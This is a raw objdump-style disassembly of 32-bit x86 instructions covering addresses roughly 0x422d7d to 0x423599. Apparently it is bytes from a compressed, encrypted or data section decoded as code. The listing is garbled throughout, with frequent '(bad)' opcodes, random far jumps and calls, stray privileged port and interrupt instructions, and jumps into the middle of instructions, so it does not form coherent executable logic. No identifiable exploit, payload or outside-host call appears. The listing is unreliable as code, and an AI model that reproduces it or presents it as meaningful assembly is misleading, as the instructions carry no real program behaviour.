  422d7d:	ficomp WORD PTR [esi-0x41c91ed8]
  422d83:	xor    ah,BYTE PTR [edx]
  422d85:	xlat   BYTE PTR ds:[ebx]
  422d86:	sbb    BYTE PTR fs:[ebx],bh
  422d89:	sub    BYTE PTR [ecx],bh
  422d8b:	push   esp
  422d8c:	or     ebp,eax
  422d8e:	int    0xe4
  422d90:	ret    
  422d91:	xchg   edx,eax
  422d92:	das    
  422d93:	jmp    0x422df8
  422d95:	cmp    BYTE PTR [ebp+ebx*8-0x148f4549],bh
  422d9c:	(bad)  
  422d9e:	mov    fs,WORD PTR [edx]
  422da0:	arpl   WORD PTR [esi],sp
  422da2:	icebp  
  422da3:	scas   al,BYTE PTR es:[edi]
  422da4:	fadd   DWORD PTR [esi]
  422da6:	push   ebx
  422da7:	sbb    cl,ch
  422da9:	aaa    
  422daa:	xor    edx,DWORD PTR [eax+0x23]
  422dad:	adc    DWORD PTR [edi],eax
  422daf:	inc    esp
  422db0:	fs dec edx
  422db2:	(bad)  
  422db3:	cmp    BYTE PTR [edx-0x15],dl
  422db6:	pop    ds
  422db7:	adc    ebx,ebx
  422db9:	mov    ebp,0xce5f84bf
  422dbe:	adc    bh,BYTE PTR [ebx+esi*2+0x2f]
  422dc2:	mov    ecx,0xf3c7dd1d
  422dc7:	sbb    eax,0x29afbcf3
  422dcc:	(bad)  
  422dcd:	loopne 0x422dc8
  422dcf:	add    BYTE PTR [eax],cl
  422dd1:	cmp    al,BYTE PTR ds:0x82f47577
  422dd7:	std    
  422dd8:	and    al,0xe
  422dda:	sub    DWORD PTR [ebp+0x27afa409],eax
  422de0:	mov    bh,0xc7
  422de2:	pop    ds
  422de3:	dec    eax
  422de4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422de5:	mov    edi,0x5a245084
  422dea:	sbb    eax,0xdc09b6aa
  422def:	inc    esp
  422df0:	addr16 loope 0x422e44
  422df3:	cmp    DWORD PTR [esi+0x18],esi
  422df6:	and    ecx,ebp
  422df8:	jnp    0x422daa
  422dfa:	dec    ecx
  422dfb:	mov    cl,0x6
  422dfd:	rol    cl,cl
  422dff:	and    edi,eax
  422e01:	adc    eax,0xe68ae219
  422e06:	arpl   WORD PTR cs:[ebp-0x2d18e368],bx
  422e0d:	mov    ecx,0x67d999dc
  422e12:	push   esp
  422e13:	sbb    DWORD PTR gs:[edx+0x4c],0x127d9472
  422e1b:	test   eax,0x6e771ef1
  422e20:	jb     0x422df4
  422e22:	std    
  422e23:	idiv   BYTE PTR [ebx]
  422e25:	sub    bl,dl
  422e27:	and    eax,0x5098309f
  422e2c:	and    DWORD PTR [edi],0x3f
  422e2f:	and    BYTE PTR [eax-0x12badcb6],0xe6
  422e36:	jmp    0x38e7a74
  422e3b:	lahf   
  422e3c:	sahf   
  422e3d:	inc    cx
  422e3f:	or     BYTE PTR [edi+0x52],ch
  422e42:	loop   0x422dfe
  422e44:	cli    
  422e45:	pop    ss
  422e46:	mov    ch,ah
  422e48:	inc    ecx
  422e49:	xchg   ebp,eax
  422e4a:	xor    eax,0xf6d3f01b
	...
  422e57:	add    BYTE PTR [eax],al
  422e59:	add    cl,bh
  422e5b:	std    
  422e5c:	in     eax,dx
  422e5d:	mov    cl,0xed
  422e5f:	mov    cl,0xfd
  422e61:	std    
  422e62:	cmp    bl,BYTE PTR [edi-0x1dee013c]
  422e68:	(bad)  
  422e69:	xchg   edi,eax
  422e6a:	iret   
  422e6b:	test   al,0x1
  422e6d:	add    ch,bh
  422e6f:	add    DWORD PTR [eax],eax
  422e71:	add    BYTE PTR [ecx],dh
  422e73:	std    
  422e74:	dec    esp
  422e75:	xchg   dh,bl
  422e77:	adc    al,0xf8
  422e79:	ror    DWORD PTR [edx-0x2],0x67
  422e7d:	or     al,0xd8
  422e7f:	cld    
  422e80:	nop
  422e81:	popf   
  422e82:	in     eax,dx
  422e83:	ds mov edi,0xae97878c
  422e89:	mov    dh,0x5
  422e8b:	xrelease mov BYTE PTR [edi+ecx*4+0x3ae8858c],dl
  422e93:	cmp    BYTE PTR [ecx+esi*1-0x25cd0dff],bh
  422e9a:	xchg   ebx,eax
  422e9b:	push   cs
  422e9c:	(bad)  
  422e9d:	pop    ecx
  422e9e:	icebp  
  422e9f:	sbb    eax,DWORD PTR [eax-0x6c95fea0]
  422ea5:	pop    ecx
  422ea6:	(bad)
  422ea9:	rcl    esi,cl
  422eab:	loop   0x422e72
  422ead:	sbb    al,0x5
  422eaf:	cmc    
  422eb0:	rcr    DWORD PTR [esi],0xb1
  422eb3:	jbe    0x422efc
  422eb5:	cli    
  422eb6:	sub    ebp,esi
  422eb8:	push   ds
  422eb9:	xor    dl,BYTE PTR [edx-0x6c]
  422ebc:	inc    ecx
  422ebd:	jmp    0x422f35
  422ebf:	mov    bl,0x97
  422ec1:	fcmovne st,st(5)
  422ec3:	shl    DWORD PTR [esi+0x3f],0x28
  422ec7:	adc    al,0xa1
  422ec9:	jl     0x422efb
  422ecb:	inc    esi
  422ecd:	imul   ecx,DWORD PTR [esi+0x2ee5efe],0x51
  422ed4:	test   DWORD PTR [edi-0x77],0x82dbdd57
  422edb:	pop    eax
  422edc:	in     al,0xaa
  422ede:	sub    BYTE PTR [edi-0x48f36791],bh
  422ee4:	fnsave [ecx-0x1dc4bb7c]
  422eea:	int    0xb0
  422eec:	xchg   edx,eax
  422eed:	xor    BYTE PTR [edx+ebx*1+0x52cb6abe],0x6e
  422ef5:	scas   eax,DWORD PTR es:[edi]
  422ef6:	jmp    0x422e93
  422ef8:	cwde   
  422ef9:	loop   0x422ee4
  422efb:	loop   0x422f62
  422efd:	aaa    
  422efe:	loopne 0x422f0c
  422f00:	xchg   DWORD PTR [ebx],esi
  422f02:	mov    ebp,0xddc66c55
  422f07:	rol    BYTE PTR [edi+eax*2+0x7a0d38e9],cl
  422f0e:	pop    edi
  422f0f:	dec    ebp
  422f10:	xor    eax,0xbaca355
  422f15:	sbb    al,0xa5
  422f17:	jmp    0x83db:0xd0a31841
  422f1e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422f1f:	das    
  422f20:	test   BYTE PTR [ebp-0x403c31a2],dh
  422f26:	mov    bl,0xb3
  422f28:	pop    ebx
  422f29:	add    dh,dl
  422f2b:	and    ah,BYTE PTR [ebx+esi*4-0x50e2878]
  422f32:	xchg   esi,esi
  422f34:	shr    edx,1
  422f36:	xchg   ecx,eax
  422f37:	xor    eax,0x94883229
  422f3c:	out    0xe4,al
  422f3e:	ins    DWORD PTR es:[edi],dx
  422f3f:	and    eax,DWORD PTR [ebx*1+0x2ec9c045]
  422f46:	mov    ebx,eax
  422f48:	sub    esi,DWORD PTR [edi-0x333a2d48]
  422f4e:	ret    
  422f4f:	and    bl,BYTE PTR [eax+ebp*2-0x5dc52da7]
  422f56:	ret    0x221e
  422f59:	shl    eax,cl
  422f5b:	adc    eax,0x4b333f08
  422f60:	pop    edi
  422f61:	inc    ebp
  422f62:	dec    esi
  422f63:	mov    edx,0x826add2c
  422f68:	sub    ebp,0x3f
  422f6b:	das    
  422f6c:	cmp    DWORD PTR [ebx-0x28],ecx
  422f6f:	xchg   esp,eax
  422f70:	adc    al,0xef
  422f72:	xchg   ebx,eax
  422f73:	fnstenv [edx+0x12]
  422f76:	aas    
  422f77:	lock aam 0x89
  422f7a:	sbb    BYTE PTR [ebp+0x67],dl
  422f7d:	icebp  
  422f7e:	add    edi,DWORD PTR [edi-0x67]
  422f81:	gs (bad) 
  422f83:	das    
  422f84:	cli    
  422f85:	push   esi
  422f86:	retf   
  422f87:	shl    DWORD PTR [esi],cl
  422f89:	(bad)
  422f8c:	and    al,0x96
  422f8e:	adc    BYTE PTR [edx+0x18c6009b],bh
  422f94:	pop    edx
  422f95:	outs   dx,BYTE PTR ds:[esi]
  422f96:	ins    BYTE PTR es:[edi],dx
  422f97:	xchg   DWORD PTR [ebp+0x21],edi
  422f9a:	nop
  422f9b:	stc    
  422f9c:	sti    
  422f9d:	jae    0x423000
  422f9f:	xor    al,dh
  422fa1:	sub    BYTE PTR [ebx-0x37],ah
  422fa4:	push   cs
  422fa5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422fa6:	sbb    DWORD PTR [eax],esp
  422fa8:	dec    edx
  422fa9:	mov    cl,0xc2
  422fab:	out    dx,eax
  422fac:	mov    cl,0x27
  422fae:	jmp    0x846ab870
  422fb3:	mov    WORD PTR [esi+0x22],gs
  422fb6:	ficom  DWORD PTR [ebx-0x1abfc3e0]
  422fbc:	inc    eax
  422fbd:	stos   BYTE PTR es:[edi],al
  422fbe:	sbb    al,0xa5
  422fc0:	stos   DWORD PTR es:[edi],eax
  422fc1:	and    eax,0x8f628059
  422fc6:	xchg   edi,eax
  422fc7:	jmp    0xfe4d:0x5b8e8cde
  422fce:	jbe    0x423026
  422fd0:	pop    esp
  422fd1:	(bad)  
  422fd2:	mov    ah,0x37
  422fd4:	adc    BYTE PTR ds:0x2e937110,ah
  422fda:	aaa    
  422fdb:	inc    ecx
  422fdc:	(bad)  
  422fdd:	leave  
  422fde:	fmul   DWORD PTR [ecx+esi*1-0x24]
  422fe2:	push   eax
  422fe3:	fldcw  WORD PTR [ecx+ebx*4-0x17]
  422fe7:	pop    ecx
  422fe8:	cvtdq2ps xmm7,XMMWORD PTR [eax+0x52]
  422fec:	sbb    bh,BYTE PTR [eax-0x63]
  422fef:	arpl   WORD PTR [edx-0x78035726],di
  422ff5:	ss pop es
  422ff7:	jns    0x422ff4
  422ff9:	fsubr  QWORD PTR [ebp+0x8]
  422ffc:	add    bl,BYTE PTR [eax+0x55]
  422fff:	scas   eax,DWORD PTR es:[edi]
  423000:	xchg   ecx,eax
  423001:	jb     0x422fa0
  423003:	fld    QWORD PTR [ebx]
  423005:	mov    ebx,0xb47e9d05
  42300a:	int    0x13
  42300c:	cli    
  42300d:	test   eax,0x84948e1c
  423012:	mov    ss,ecx
  423014:	and    eax,DWORD PTR [esi+0x496f23f3]
  42301a:	sar    DWORD PTR [esi*1+0x16d00a21],1
  423021:	dec    esp
  423022:	mov    al,ds:0x7be5f6c0
  423027:	ret    
  423028:	sub    eax,0x26e21b26
  42302d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42302e:	shr    DWORD PTR [ebp-0x2],1
  423031:	mov    bh,0xe
  423033:	(bad)  
  423034:	fldenv [ecx+0xa]
  423037:	jns    0x4230b6
  423039:	call   0x79460a32
  42303e:	xchg   ebx,eax
  42303f:	mov    eax,0x5d2c5a89
  423044:	outs   dx,DWORD PTR ds:[esi]
  423045:	mov    ch,0x27
  423047:	fsubr  QWORD PTR [ecx+edx*1+0x2c8aaa18]
  42304e:	loop   0x42306a
  423050:	jbe    0x423002
  423052:	push   0x3aa79370
  423057:	jge    0x423091
  423059:	outs   dx,DWORD PTR ds:[esi]
  42305a:	mov    bh,0x8
  42305c:	outs   dx,BYTE PTR ds:[esi]
  42305d:	cdq    
  42305e:	std    
  42305f:	inc    eax
  423060:	pop    ecx
  423061:	mov    eax,0x7f59815c
  423066:	inc    esp
  423067:	enter  0xf083,0x39
  42306b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42306c:	mov    ebp,0x76ee
	...
  423079:	add    dl,dh
  42307b:	rol    BYTE PTR ds:0xf6d53751,0xe3
  423082:	test   BYTE PTR [eax],0xec
  423085:	inc    esi
  423086:	mov    WORD PTR [eax],cs
  423088:	repnz test ah,0xaa
  42308c:	add    DWORD PTR [eax],eax
  42308e:	std    
  42308f:	add    DWORD PTR [eax],eax
  423091:	add    cl,al
  423093:	push   ebx
  423094:	int3   
  423095:	leave  
  423096:	pop    eax
  423097:	jge    0x4230ae
  423099:	shl    BYTE PTR [eax],1
  42309b:	inc    esp
  42309c:	add    BYTE PTR [esi],ah
  42309e:	add    BYTE PTR [edi],0xad
  4230a1:	add    eax,0x46385fd3
  4230a6:	or     ah,0x4d
  4230a9:	inc    edx
  4230aa:	nop
  4230ab:	inc    DWORD PTR [ebx]
  4230ad:	jl     0x423033
  4230af:	sub    dl,BYTE PTR [edi-0x20a58bff]
  4230b5:	std    
  4230b6:	fistp  QWORD PTR [edx]
  4230b8:	xchg   esi,eax
  4230b9:	ror    bl,1
  4230bb:	hlt    
  4230bc:	jno    0x423107
  4230be:	push   ebp
  4230bf:	lods   eax,DWORD PTR ds:[esi]
  4230c0:	and    bl,al
  4230c2:	sub    al,0xed
  4230c4:	push   ecx
  4230c5:	lea    ebx,[esi]
  4230c7:	into   
  4230c8:	mov    bl,0xa
  4230ca:	in     eax,dx
  4230cb:	lahf   
  4230cc:	dec    ecx
  4230cd:	arpl   WORD PTR ds:0x3ec5476,ax
  4230d3:	add    al,0xaa
  4230d5:	imul   ebp,edx,0xffffffaf
  4230d8:	outs   dx,DWORD PTR ds:[esi]
  4230d9:	jmp    0x42307e
  4230db:	retf   0x2927
  4230de:	and    DWORD PTR [eax+0x5341d12e],eax
  4230e4:	jne    0x4230f9
  4230e6:	xchg   ebx,eax
  4230e7:	mov    al,0x28
  4230e9:	jecxz  0x4230e6
  4230eb:	push   cs
  4230ec:	in     al,0x2b
  4230ee:	clc    
  4230ef:	das    
  4230f0:	add    dh,BYTE PTR [esi+0x7d3f970c]
  4230f6:	jg     0x42312d
  4230f8:	cmp    BYTE PTR [ebx-0x5e],bh
  4230fb:	xor    dh,BYTE PTR [eax]
  4230fd:	pop    es
  4230fe:	mov    edi,0xf0f01598
  423103:	mov    al,ds:0x3e14c555
  423108:	xchg   esp,ebx
  42310a:	retf   0xec8e
  42310d:	ret    0x269e
  423110:	mov    ss,WORD PTR [ebp+0x5542a9fd]
  423116:	push   ss
  423117:	lahf   
  423118:	fdivr  DWORD PTR [edi+ecx*2]
  42311b:	mov    dl,0x9c
  42311d:	out    0x1c,eax
  42311f:	sbb    al,0xb9
  423121:	pop    eax
  423122:	mov    dl,0xe8
  423124:	jecxz  0x4230d9
  423126:	cmp    al,0x26
  423128:	ret    0xbef1
  42312b:	or     edi,DWORD PTR [ebp+0x5e]
  42312e:	add    eax,0x406f797
  423133:	sub    ebp,DWORD PTR [edx+0x30]
  423136:	lods   eax,DWORD PTR ds:[esi]
  423137:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423138:	dec    ebx
  423139:	sbb    dl,BYTE PTR [esp+ebx*8]
  42313c:	test   BYTE PTR [eax+edi*1+0x73],0x18
  423141:	cmc    
  423142:	iret   
  423143:	popf   
  423144:	jmp    0x4231a9
  423146:	or     dh,BYTE PTR [edi+0x704878fc]
  42314c:	cmc    
  42314d:	fmul   DWORD PTR [ebp+0x7a5fda67]
  423153:	inc    edx
  423154:	imul   esp,DWORD PTR [ebp-0x18f0fa04],0x82c87b8d
  42315e:	push   edx
  42315f:	dec    edx
  423160:	xor    BYTE PTR [esi],bl
  423162:	and    esi,0x73807e51
  423168:	aaa    
  423169:	sub    al,0x44
  42316b:	dec    edi
  42316c:	jns    0x4231d0
  42316e:	xor    esi,ebp
  423170:	test   bh,0x12
  423173:	mov    al,0x4
  423175:	cmp    BYTE PTR [eax+0x71c22246],dh
  42317b:	push   cs
  42317c:	lock xor eax,DWORD PTR [ebx]
  42317f:	sub    al,0xa1
  423181:	outs   dx,DWORD PTR ds:[esi]
  423182:	popf   
  423183:	jne    0x423163
  423185:	sti    
  423186:	add    ebx,DWORD PTR [esi-0x6325b5f3]
  42318c:	cmp    DWORD PTR ds:0x2eb2eff4,0xe36ac18d
  423196:	idiv   BYTE PTR [ebp+0x7f6a0561]
  42319c:	andnps xmm4,xmm7
  42319f:	xchg   esi,eax
  4231a0:	mov    ebp,DWORD PTR [ebx]
  4231a2:	mov    bl,BYTE PTR [edx]
  4231a4:	jbe    0x423133
  4231a6:	(bad)  
  4231a7:	push   0x61
  4231a9:	ds sbb al,0x91
  4231ac:	mov    WORD PTR [eax+0x15],ds
  4231af:	cmp    cl,BYTE PTR [ecx+0x1b]
  4231b2:	mov    edi,0x222225a1
  4231b7:	cmp    al,0x55
  4231b9:	jnp    0x423151
  4231bb:	inc    edi
  4231bc:	iret   
  4231bd:	(bad)  
  4231be:	clc    
  4231bf:	add    eax,edx
  4231c1:	sub    edx,eax
  4231c3:	add    ch,BYTE PTR [esp+eiz*4-0x603ac0ad]
  4231ca:	sti    
  4231cb:	aas    
  4231cc:	adc    eax,0xb3fc792
  4231d1:	imul   BYTE PTR [esi+ebx*8-0x6a]
  4231d5:	scas   al,BYTE PTR es:[edi]
  4231d6:	sub    BYTE PTR [edi+esi*1-0x393de1d0],al
  4231dd:	dec    ebp
  4231de:	mov    esp,0xa8b9d169
  4231e3:	cmp    DWORD PTR [ecx],0xffffffdb
  4231e6:	sbb    eax,0xe2a9ffd0
  4231eb:	cmovno ebp,DWORD PTR [ebx]
  4231ee:	or     cl,BYTE PTR [edx+0x61]
  4231f1:	(bad)  
  4231f3:	sub    ebp,esi
  4231f5:	pop    esp
  4231f6:	ret    0x15da
  4231f9:	shr    edx,1
  4231fb:	out    dx,eax
  4231fc:	aam    0xa9
  4231fe:	and    DWORD PTR [ebp+0x66857095],ebx
  423204:	sbb    DWORD PTR [edx],edx
  423206:	test   al,0xe8
  423208:	out    dx,eax
  423209:	pop    edx
  42320a:	les    edi,FWORD PTR [ecx-0x79c5a7ec]
  423210:	mov    esi,0xf3970287
  423215:	push   ds
  423216:	loopne 0x423255
  423218:	xchg   DWORD PTR [ecx+0x55],eax
  42321b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42321c:	add    edx,DWORD PTR [ebx-0x49cdabac]
  423222:	adc    DWORD PTR [esi+0x3b46adeb],edx
  423228:	stc    
  423229:	lds    esp,FWORD PTR [esi+eax*4]
  42322c:	jge    0x423248
  42322e:	cdq    
  42322f:	inc    edx
  423230:	retf   
  423231:	gs repz (bad) 
  423234:	(bad)  
  423237:	das    
  423238:	sub    ecx,DWORD PTR [ebx]
  42323a:	test   eax,0xb0a64a43
  42323f:	aam    0x39
  423241:	ja     0x4231e3
  423243:	ins    BYTE PTR es:[edi],dx
  423244:	mov    dh,0xa7
  423246:	pop    edx
  423247:	mov    edi,0x6c386f0
  42324c:	addr16 jns 0x4231fa
  42324f:	sub    ecx,DWORD PTR [ebp-0x7a]
  423252:	ror    esp,0x62
  423255:	call   0x759f:0x570ece49
  42325c:	or     esp,DWORD PTR [edx-0x47112b1d]
  423262:	jl     0x42322f
  423264:	mov    bl,dl
  423266:	jne    0x423256
  423268:	jbe    0x42329b
  42326a:	cs and esi,ebx
  42326d:	call   0x8984:0x11343f6f
  423274:	cmp    DWORD PTR [esi],0xfffffff3
  423277:	scas   eax,DWORD PTR es:[edi]
  423278:	not    ecx
  42327a:	or     esp,DWORD PTR [ebx+0x5d72c98d]
  423280:	shl    DWORD PTR [ebx],1
  423282:	dec    ebx
  423283:	loopne 0x4232d2
  423285:	or     eax,DWORD PTR [eax-0x6b914e50]
  42328b:	out    dx,al
  42328c:	xor    eax,0x6b69
	...
  423299:	add    BYTE PTR [ebx+0x41],al
  42329c:	popa   
  42329d:	data16 arpl WORD PTR [esi+0x47],sp
  4232a1:	gs push cs
  4232a3:	mov    BYTE PTR [edi-0x37],bh
  4232a6:	jmp    0xc987177c
  4232ab:	lods   al,BYTE PTR ds:[esi]
  4232ac:	add    DWORD PTR [eax],eax
  4232ae:	std    
  4232af:	add    DWORD PTR [eax],eax
  4232b1:	add    BYTE PTR [esi-0x7],cl
  4232b4:	and    BYTE PTR [esi-0x2d],ah
  4232b7:	fild   WORD PTR [edi+esi*4+0x74bc1e12]
  4232be:	dec    esi
  4232bf:	(bad)  [eax]
  4232c1:	and    esi,0xa59d89da
  4232c7:	(bad)  
  4232c9:	xchg   esi,eax
  4232ca:	xor    ecx,DWORD PTR [ecx]
  4232cc:	shl    DWORD PTR [ecx+0x5aa37c6f],1
  4232d2:	cmp    DWORD PTR [edi],ecx
  4232d4:	(bad)  
  4232d5:	out    dx,eax
  4232d6:	in     eax,0x59
  4232d8:	mov    bl,0x46
  4232da:	cmp    DWORD PTR [edx+0x32],esp
  4232dd:	hlt    
  4232de:	js     0x423291
  4232e0:	(bad)  
  4232e1:	stc    
  4232e2:	test   BYTE PTR [eax+0x5],0xbb
  4232e6:	outs   dx,BYTE PTR ds:[esi]
  4232e7:	pop    edx
  4232e8:	cmp    eax,0x3d1569f2
  4232ed:	cmp    DWORD PTR [ecx-0x650195a8],0xff7b50f7
  4232f7:	lods   eax,DWORD PTR ds:[esi]
  4232f8:	out    0x60,al
  4232fa:	test   BYTE PTR [esi],dl
  4232fc:	call   0x5b88:0x2b625be7
  423303:	mov    dh,0x6b
  423305:	fidivr DWORD PTR [eax]
  423307:	fucomp st(2)
  423309:	les    edx,FWORD PTR [ebp+0x53]
  42330c:	stos   DWORD PTR es:[edi],eax
  42330d:	pop    ebx
  42330e:	fsub   DWORD PTR [ecx+eiz*4]
  423311:	mov    DWORD PTR [eax+0x13],eax
  423314:	pop    edx
  423315:	mov    edx,eax
  423317:	mov    edx,0x81791dc9
  42331c:	dec    edi
  42331d:	cmc    
  42331e:	jge    0x4232ce
  423320:	inc    edi
  423321:	pop    ebp
  423322:	xchg   esp,eax
  423323:	sub    esi,ebx
  423325:	iret   
  423326:	sbb    esp,0xffffffd4
  423329:	mov    ds:0x97063eb7,eax
  42332e:	jnp    0x42335f
  423330:	in     eax,dx
  423331:	ins    DWORD PTR es:[edi],dx
  423332:	cmp    al,0x13
  423334:	call   0x218e3027
  423339:	fxtract 
  42333b:	xchg   esp,eax
  42333c:	xchg   ebx,eax
  42333d:	ds xor esp,0xffffffc3
  423341:	leave  
  423342:	dec    ecx
  423343:	adc    dl,BYTE PTR [eax]
  423345:	or     ebx,ebx
  423347:	xchg   edx,eax
  423348:	cld    
  423349:	in     al,0x62
  42334b:	xchg   ecx,eax
  42334c:	loope  0x423331
  42334e:	sahf   
  42334f:	push   0x3b6ac5d1
  423354:	cdq    
  423355:	xchg   esi,eax
  423356:	cld    
  423357:	dec    ecx
  423358:	xor    al,0xed
  42335a:	mov    esp,0x7959c3c1
  42335f:	mov    eax,0x8414910f
  423364:	neg    DWORD PTR [edi]
  423366:	inc    edx
  423367:	cmp    BYTE PTR [esi+eiz*1],dl
  42336a:	sub    BYTE PTR [ebx-0x1d],dh
  42336d:	xchg   esi,eax
  42336e:	ficom  DWORD PTR [ebx+0x7cc25cb7]
  423374:	cmp    al,0x2b
  423376:	and    eax,0xdbcbd5b8
  42337b:	enter  0x4e37,0x36
  42337f:	in     al,0xb5
  423381:	xchg   esi,eax
  423382:	ins    DWORD PTR es:[edi],dx
  423383:	or     eax,0x89d7ab4d
  423388:	cmp    eax,0x6c5e0151
  42338d:	std    
  42338e:	into   
  42338f:	mov    edx,0x83319d2
  423394:	(bad)  
  423396:	xchg   ebx,eax
  423397:	mov    edx,0x822eea3f
  42339c:	sar    ch,cl
  42339e:	fidivr DWORD PTR [eax+0x16]
  4233a1:	ret    
  4233a2:	adc    BYTE PTR [edx-0x57d37a04],bh
  4233a8:	shr    DWORD PTR [eax],1
  4233aa:	into   
  4233ab:	scas   al,BYTE PTR es:[edi]
  4233ac:	jmp    0x7270:0xcb640eab
  4233b3:	ss inc ebx
  4233b5:	not    BYTE PTR [eax+0xb7ee23c]
  4233bb:	fisubr WORD PTR [ebx-0x68dafc82]
  4233c1:	dec    edi
  4233c2:	cmp    DWORD PTR [edx+0x6a],ebx
  4233c5:	pop    eax
  4233c6:	push   ss
  4233c7:	retf   0x3b80
  4233ca:	mov    DWORD PTR [edi-0x2a],esp
  4233cd:	retf   0xa277
  4233d0:	xor    esp,DWORD PTR [eax-0x3d98d9e7]
  4233d6:	mov    ebx,0xf5a3bad3
  4233db:	loop   0x423400
  4233dd:	retf   
  4233de:	jmp    DWORD PTR [eax-0x40]
  4233e1:	mov    esp,0xa0117a64
  4233e6:	enter  0x178f,0xf8
  4233ea:	imul   esp,DWORD PTR [ebp-0x71],0xffffffbc
  4233ee:	dec    esp
  4233ef:	fst    DWORD PTR [edx-0x590ac00f]
  4233f5:	retf   
  4233f6:	xchg   esi,eax
  4233f7:	sub    BYTE PTR [edi+edi*2-0x57],0xfb
  4233fc:	dec    edx
  4233fd:	das    
  4233fe:	jo     0x4233d3
  423400:	push   ds
  423401:	retf   0x813b
  423404:	vmovups XMMWORD PTR [eax-0x69502359],xmm5
  42340c:	out    dx,al
  42340d:	lahf   
  42340e:	push   es
  42340f:	mov    dl,0x19
  423411:	retf   0x88bb
  423414:	dec    edx
  423415:	mov    bh,0x88
  423417:	call   0xf5d8:0xb18f57d
  42341e:	and    edi,DWORD PTR [edi+0x74b92f6c]
  423424:	sbb    al,0xbb
  423426:	mov    dl,0x37
  423428:	sti    
  423429:	popf   
  42342a:	dec    edi
  42342b:	add    eax,0x90903873
  423430:	daa    
  423431:	shl    al,cl
  423433:	cli    
  423434:	pop    edx
  423435:	xor    al,BYTE PTR [edx-0x57]
  423438:	sbb    al,0x9d
  42343a:	fs in  al,dx
  42343c:	scas   al,BYTE PTR es:[edi]
  42343d:	in     al,dx
  42343e:	mov    dl,BYTE PTR [ecx+0x28]
  423441:	je     0x4234ba
  423443:	scas   eax,DWORD PTR es:[edi]
  423444:	in     al,dx
  423445:	xchg   ecx,eax
  423446:	dec    edx
  423447:	mov    esp,0xc79333e5
  42344c:	ins    BYTE PTR es:[edi],dx
  42344d:	or     eax,0x803d2f24
  423452:	mov    ah,0xb9
  423454:	es xor esp,0xffffffd8
  423458:	push   edx
  423459:	imul   ebx,DWORD PTR [esi-0x27],0xffffff83
  42345d:	gs test al,0x97
  423460:	inc    ch
  423462:	fs push 0x1e56e38d
  423468:	cmp    eax,0x48446609
  42346d:	pushf  
  42346e:	inc    edx
  42346f:	leave  
  423470:	add    al,0xbb
  423472:	int    0x13
  423474:	sbb    eax,0x30c3c273
  423479:	mov    fs,WORD PTR [edi+eax*4]
  42347c:	sub    DWORD PTR [eax],esp
  42347e:	xor    eax,DWORD PTR [esp+esi*8+0x44]
  423482:	xchg   esi,eax
  423483:	or     ebx,eax
  423485:	mov    dl,0xb5
  423487:	push   0x4666241b
  42348c:	fstp   QWORD PTR [edi-0x18]
  42348f:	(bad)  
  423491:	mov    ecx,0x3a001dea
  423496:	fchs   
  423498:	xchg   BYTE PTR [esi-0x31362dcb],dl
  42349e:	push   ebp
  42349f:	out    dx,al
  4234a0:	mov    al,ds:0x72bde215
  4234a5:	jmp    0x847a:0x35632242
  4234ac:	dec    ecx
  4234ad:	inc    cx
	...
  4234b7:	add    BYTE PTR [eax],al
  4234b9:	add    BYTE PTR [ebx-0xce42c16],cl
  4234bf:	cmp    ecx,ebx
  4234c1:	cli    
  4234c2:	cmp    dh,bl
  4234c4:	adc    BYTE PTR [ebx],dl
  4234c6:	and    al,0xc3
  4234c8:	mov    cl,0x6b
  4234ca:	(bad)  
  4234cb:	scas   al,BYTE PTR es:[edi]
  4234cc:	add    DWORD PTR [eax],eax
  4234ce:	std    
  4234cf:	add    DWORD PTR [eax],eax
  4234d1:	add    BYTE PTR [ebx+ebx*1],dl
  4234d4:	lds    eax,FWORD PTR [ebp-0x1c0f17d3]
  4234da:	test   DWORD PTR [esi+0x6e77c964],edx
  4234e0:	xor    al,0xd2
  4234e2:	xchg   ebp,eax
  4234e3:	ror    DWORD PTR [esi+eax*4],0x94
  4234e7:	jae    0x90a2180c
  4234ed:	popf   
  4234ee:	mov    ecx,0xd308d95a
  4234f3:	xchg   BYTE PTR [eax+0x55679b5d],al
  4234f9:	inc    ecx
  4234fa:	icebp  
  4234fb:	repz cmp cl,cl
  4234fe:	lds    eax,FWORD PTR [eax+0x7b]
  423501:	sbb    DWORD PTR [edx-0x4a],0xfffffff0
  423505:	iret   
  423506:	stc    
  423507:	lock in eax,dx
  423509:	scas   al,BYTE PTR es:[edi]
  42350a:	stos   BYTE PTR es:[edi],al
  42350b:	and    eax,0xd2ce1788
  423510:	adc    edi,eax
  423512:	cwde   
  423513:	out    0x9b,al
  423515:	(bad)  
  423516:	rol    ch,cl
  423518:	mov    ebx,0xf8167eaf
  42351d:	test   DWORD PTR [edi-0x7b493511],edx
  423523:	(bad)  
  423524:	in     eax,dx
  423525:	jns    0x423554
  423527:	pop    ebx
  423528:	shl    DWORD PTR [eax-0xb3406d6],cl
  42352e:	mov    esi,0xce6a1d8d
  423533:	fs push ebx
  423535:	add    al,0xca
  423537:	fstp   DWORD PTR [eax]
  423539:	test   DWORD PTR [edx+0x2a0c8c1a],esp
  42353f:	sbb    edi,DWORD PTR [edi-0x410a8b7f]
  423545:	lods   al,BYTE PTR ds:[esi]
  423546:	cmp    eax,0x25a8a26b
  42354b:	rol    BYTE PTR [ebp+0x46],0x11
  42354f:	sti    
  423550:	test   bl,al
  423552:	loopne 0x423592
  423554:	(bad)  
  423555:	daa    
  423556:	jbe    0x4235c9
  423558:	and    DWORD PTR [esi+edx*2-0x3670941f],eax
  42355f:	adc    al,0x8e
  423561:	inc    edi
  423562:	adc    BYTE PTR [esi-0x3d748a8d],0x5d
  423569:	dec    ebx
  42356a:	shl    eax,1
  42356c:	or     dl,cl
  42356e:	imul   ebx,DWORD PTR [ecx+0x40],0x7
  423572:	jns    0x423558
  423574:	lahf   
  423575:	adc    ebp,DWORD PTR [ebp+eiz*1-0x62]
  423579:	lds    edx,FWORD PTR [esi+0x2d60d001]
  42357f:	mov    ebx,0xe270aae1
  423584:	jge    0x42357e
  423586:	push   ss
  423587:	sbb    eax,0x8f8c6406
  42358c:	sbb    BYTE PTR [ebx],cl
  42358e:	inc    edx
  42358f:	inc    esp
  423590:	ret    
  423591:	and    ah,BYTE PTR [edi-0x73f60b4e]
  423597:	jl     0x42358e
  423599:	add    eax,0x1401437e
